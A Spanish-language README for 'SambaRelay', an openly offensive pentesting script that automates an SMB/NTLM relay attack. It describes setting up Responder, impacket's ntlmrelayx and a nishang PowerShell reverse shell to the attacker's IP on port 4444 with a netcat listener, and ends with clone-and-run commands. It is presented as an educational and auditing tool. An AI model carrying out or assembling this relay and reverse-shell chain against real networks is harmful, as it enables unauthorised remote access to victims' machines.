# SambaRelay

Canal de youtube  https://youtube.com/c/Anonimo501

Grupo en Telegram https://t.me/Pen7esting

## Samba Relay

Este script es creado para fines educativos o para hacer auditorias profesionales de pentesting a nivel empresarial, no me hago responsable del mal uso de dicho  script, este script automatiza la modificacion del archivo Responder.conf en los valores SMB = Off y HTTP = Off, locual lo deja a la escucha, tambien descarga automaticamente https://github.com/SecureAuthCorp/impacket y descarga https://github.com/samratashok/nishang en nishang ingresa a nishang/Shells/ copia el archivo y lo renombra cp Invoke-PowerShellTcp.ps1 PS.ps1, al archivo PS.ps1 se le añade una linea al final que es la siguiente  Invoke-PowerShellTcp -Reverse -IPAddress $hacker -Port 4444, se deja a la escucha un server http automaticamente con el siguiente comando python -m SimpleHTTPServer, dejamos nc a la escucha rlwrap nc -nlvp 4444, no es necesario instalar los requerimientos de impacket o nishang ya que el script lo hace automaticamente, tambien crea un archivo llamado targets.txt dentro de /impacket/examples el cual contiene la  ip victima y por ultimo se ejecutal ntlmrelayx.py para lograr el acceso.

El script se ejecuto sobre ParrotOS

![Screenshot_1](https://user-images.githubusercontent.com/67207446/119040557-2eaae600-b97b-11eb-8cf6-0ac4d2581527.png)




git clone https://github.com/Anonimo501/SambaRelay.git

cd SambaRelay

chmod +x smb_relay.sh

./smb_relay.sh
